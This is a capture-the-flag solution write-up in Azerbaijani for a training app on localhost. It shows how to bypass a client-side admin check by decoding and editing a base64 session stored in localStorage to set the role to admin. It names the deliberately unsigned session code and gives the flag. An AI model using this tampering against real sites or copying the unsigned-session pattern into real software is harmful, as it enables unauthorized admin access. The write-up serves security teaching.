# Challenge 3 — Client-Side Access Control Bypass (Orta)

## Məqsəd
LocalStorage-dakı rol məlumatını dəyişdirərək admin panelə daxil olmaq.

## Həll yolu
1. `/admin-panel` route-una get — `/unauthorized` səhifəsinə yönləndiriləcəksiniz
2. F12 → Application → Local Storage → `http://localhost:3000`
3. `userSession` açarını tap — base64 encoded JSON görəcəksiniz
4. Dəyəri decode et:
   ```
   atob("eyJ1aWQiOiJkZW1vLXVpZC0wMDEiLCJlbWFpbCI6InVzZXJAZGV0ZWNoLmlvIiwicm9sZSI6ImFuYWx5c3QiLCJleHAiOjE3MzAwMDAwMDB9")
   // → {"uid":"demo-uid-001","email":"user@detech.io","role":"analyst","exp":...}
   ```
5. `role` dəyərini `"analyst"` → `"admin"` olaraq dəyişdir:
   ```js
   localStorage.setItem("userSession", btoa(JSON.stringify({
     uid: "demo-uid-001",
     email: "user@detech.io",
     role: "admin",
     exp: Date.now() + 86400000
   })))
   ```
6. Səhifəni yenilə → Admin panelə daxil olacaqsınız

## Zəiflik yeri
`app/(dashboard)/admin-panel/page.tsx` — `getLegacySession().role !== 'admin'`
`lib/auth/session-helper.ts` — imzasız, dəyişdirilə bilən session

## CTF Flag
`CTF{client_side_auth_localStorage_bypass}`

## Real dünya analoquu
OWASP Top 10: A01:2021 — Broken Access Control
Rol yoxlaması həmişə server tərəfində (JWT, session middleware) edilməlidir.
